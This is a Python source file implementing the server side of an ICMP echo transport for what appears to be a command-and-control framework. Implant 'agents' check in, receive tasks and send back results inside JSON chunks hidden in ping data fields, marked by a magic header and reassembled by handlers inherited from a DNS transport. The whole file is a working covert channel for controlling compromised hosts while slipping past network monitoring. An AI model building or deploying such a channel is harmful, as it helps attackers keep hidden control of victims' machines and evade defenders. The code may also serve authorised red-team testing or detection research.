"""ICMP echo transport.

The agent sends an ICMP echo request whose data field carries a
JSON envelope with a base64url-encoded chunk of the payload. The
server listens on a raw ICMP socket, reassembles the chunks, feeds
the payload through the same engine handlers the DNS transport
uses, and sends the response back as the data field of an ICMP
echo reply.

This transport subclasses DNSTransport so it inherits the session
token machinery, chunk reassembly, TTL sweep, and the check-in,
tasks, and results handlers unchanged. Only the wire plumbing
differs: DNS parses its inputs from QNAME labels, ICMP parses
them from a JSON envelope in the ICMP data field.

Requires CAP_NET_RAW on Linux (or sudo). The transport refuses to
start without it rather than silently failing to read replies.

Not implemented on Windows; the socket API and privilege model
differ enough that a second implementation is a project of its own.
"""

from __future__ import annotations

import base64
import json
import os
import socket
import struct
import threading
import time

from .dns import DNSTransport, _b64d, _HEX4, _HEX8

_ICMP_ECHO_REPLY = 0
_ICMP_ECHO_REQUEST = 8
_ICMPV6_ECHO_REQUEST = 128
_ICMPV6_ECHO_REPLY = 129
_ICMP_CHUNK_CLIENT = 900
_MAGIC = b"TC2\x01"


class ICMPTransport(DNSTransport):

    name = 'icmp'
    REPLY_BUDGET_CHARS = 1000
    REPLY_BUDGET_LABEL = "ICMP data field budget"

    def __init__(self, engine, host, port, config=None):
        super().__init__(engine, host, port, config)
        self.domain = ''
        self._sock = None
        self._sock_v6 = None
        self._thread = None
        self._thread_v6 = None
        self._rl_lock = threading.Lock()
        self._rl_state = {}
        self.RL_RATE = 20.0
        self.RL_BURST = 200.0
        self.RL_IDLE_PRUNE = 600.0

    def _parse_request_labels(self, labels):
        """Override the parent's parser. The parent's length label
        is 2 hex digits because DNS chunks are 63 characters. ICMP
        chunks are up to 900 characters and a single transfer can
        assemble up to 200 chunks, so the length label carries
        eight hex digits.

        Everything else is identical to the parent."""
        if len(labels) < 7:
            raise ValueError('too few labels')
        verb = labels[0].lower()
        sid  = labels[1].lower()
        xfer = labels[2].lower()
        if not _HEX4.match(labels[3]):
            raise ValueError('bad seq label')
        if not _HEX4.match(labels[4]):
            raise ValueError('bad total label')
        if not _HEX8.match(labels[5]):
            raise ValueError('bad len label')
        seq = int(labels[3], 16)
        total = int(labels[4], 16)
        chunk_len = int(labels[5], 16)
        if total <= 0 or total > self.CHUNK_MAX:
            raise ValueError('total out of range')
        if seq < 0 or seq >= total:
            raise ValueError('seq out of range')
        raw = labels[6]
        if chunk_len == 0:
            if raw != '0':
                raise ValueError('filler expected for empty chunk')
            chunk = ''
        else:
            if len(raw) != chunk_len:
                raise ValueError('chunk label length mismatch')
            chunk = raw
        return verb, sid, xfer, seq, total, chunk

    # ------------------------------------------------------------------
    # Lifecycle

    def start(self):
        if os.name == 'nt':
            self.log("ICMP transport is not implemented on Windows")
            return False

        try:
            self._sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW,
                socket.IPPROTO_ICMP)
            self._sock.settimeout(1.0)
        except PermissionError:
            self.log("ICMP transport requires CAP_NET_RAW — run "
                     "the handler with sudo, or set the capability "
                     "on the python binary")
            return False
        except OSError as exc:
            self.log(f"ICMP socket: {exc}")
            return False

        try:
            self._sock_v6 = socket.socket(
                socket.AF_INET6, socket.SOCK_RAW,
                socket.IPPROTO_ICMPV6)
            self._sock_v6.settimeout(1.0)
        except Exception:
            self._sock_v6 = None

        self._running = True
        self._thread = threading.Thread(
            target=self._recv_loop, args=(self._sock, False),
            daemon=True)
        self._thread.start()
        if self._sock_v6 is not None:
            self._thread_v6 = threading.Thread(
                target=self._recv_loop,
                args=(self._sock_v6, True), daemon=True)
            self._thread_v6.start()

        threading.Thread(
            target=self._rate_prune_loop, daemon=True).start()

        self.log(f"ICMP listener on raw socket "
                 f"chunk={_ICMP_CHUNK_CLIENT}")
        return True

    def stop(self):
        self._running = False
        for s in (self._sock, self._sock_v6):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    # ------------------------------------------------------------------
    # Receive and dispatch

    def _recv_loop(self, sock, ipv6):
        while self._running:
            try:
                data, addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                return
            try:
                self._handle_packet(sock, data, addr, ipv6)
            except Exception as exc:
                self.log(f"icmp: {exc}")

    def _handle_packet(self, sock, packet, addr, ipv6):
        client_ip = addr[0]

        if ipv6:
            if len(packet) < 8 or packet[0] != _ICMPV6_ECHO_REQUEST:
                return
            echo_id, echo_seq = struct.unpack('>HH', packet[4:8])
            payload = packet[8:]
        else:
            if len(packet) < 28:
                return
            ihl = (packet[0] & 0x0F) * 4
            if ihl < 20 or len(packet) < ihl + 8:
                return
            if packet[ihl] != _ICMP_ECHO_REQUEST:
                return
            echo_id, echo_seq = struct.unpack(
                '>HH', packet[ihl + 4:ihl + 8])
            payload = packet[ihl + 8:]

        if not payload.startswith(_MAGIC):
            return
        if not self._rate_allowed(client_ip):
            return

        try:
            msg = json.loads(payload[len(_MAGIC):].decode('utf-8'))
        except Exception:
            return

        verb = msg.get('v', '')
        sid_label = msg.get('sid', '')
        xfer = msg.get('x', '')
        try:
            seq = int(msg.get('s', 0))
            total = int(msg.get('t', 1))
        except (TypeError, ValueError):
            return
        chunk = msg.get('c', '')

        if verb not in ('b', 't', 'r'):
            return
        if total <= 0 or total > self.CHUNK_MAX:
            return
        if seq < 0 or seq >= total:
            return

        key = (client_ip, verb, xfer)
        try:
            assembled = self._accept_chunk(key, seq, total, chunk)
        except ValueError as exc:
            self.log(f"refused: {exc}")
            return
        if assembled is None:
            # Intermediate ACK. Empty body.
            self._send_reply(sock, addr, echo_id, echo_seq,
                             b'', ipv6)
            return

        try:
            body = self._dispatch(verb, sid_label, xfer,
                                  assembled, client_ip)
        except ValueError as exc:
            self.log(f"refused: {exc}")
            body = b''
        except Exception as exc:
            self.log(f"error: {exc}")
            body = b''

        self._send_reply(sock, addr, echo_id, echo_seq, body, ipv6)

    def _dispatch(self, verb, sid_label, xfer, assembled, client_ip):
        chunk = assembled
        length_label = f"{len(chunk):08x}"
        chunk_label = chunk if chunk else "0"
        labels = [
            verb,
            sid_label,
            xfer,
            '0000',  # seq — parent ignores for check-in
            '0001',  # total — parent ignores for check-in
            length_label,
            chunk_label,
        ]
        if verb == 'b':
            return self._handle_checkin(labels, client_ip)
        if verb == 't':
            return self._handle_tasks(labels, client_ip)
        if verb == 'r':
            return self._handle_results(labels, client_ip)
        return b''

    # ------------------------------------------------------------------
    # Reply

    MAX_REPLY_BODY = 1400

    def _send_reply(self, sock, addr, echo_id, echo_seq,
                    body, ipv6):
        if len(body) > self.MAX_REPLY_BODY:
            self.log(
                f"icmp: reply body {len(body)} bytes exceeds "
                f"{self.MAX_REPLY_BODY}-byte data-field cap; "
                f"dropping. The task is too large for the ICMP "
                f"transport — use HTTP.")
            return

        data = _MAGIC + body
        if ipv6:
            header = struct.pack(
                '>BBHHH', _ICMPV6_ECHO_REPLY, 0, 0,
                echo_id, echo_seq)
        else:
            checksum = _icmp_checksum(
                _ICMP_ECHO_REPLY, 0, echo_id, echo_seq, data)
            header = struct.pack(
                '>BBHHH', _ICMP_ECHO_REPLY, 0, checksum,
                echo_id, echo_seq)
        try:
            sock.sendto(header + data, addr)
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Rate limit

    def _rate_allowed(self, ip):
        now = time.monotonic()
        with self._rl_lock:
            tokens, last = self._rl_state.get(
                ip, (self.RL_BURST, now))
            tokens = min(self.RL_BURST,
                         tokens + (now - last) * self.RL_RATE)
            if tokens < 1.0:
                self._rl_state[ip] = (tokens, now)
                return False
            self._rl_state[ip] = (tokens - 1.0, now)
            return True

    def _rate_prune_loop(self):
        while self._running:
            time.sleep(120)
            cutoff = time.monotonic() - self.RL_IDLE_PRUNE
            with self._rl_lock:
                stale = [k for k, (_, last) in
                         self._rl_state.items()
                         if last < cutoff]
                for k in stale:
                    self._rl_state.pop(k, None)


def _icmp_checksum(icmp_type, icmp_code, icmp_id, icmp_seq, data):
    header = struct.pack('>BBHHH', icmp_type, icmp_code, 0,
                         icmp_id, icmp_seq)
    body = header + data
    if len(body) % 2:
        body += b'\x00'
    total = 0
    for i in range(0, len(body), 2):
        total += (body[i] << 8) | body[i + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF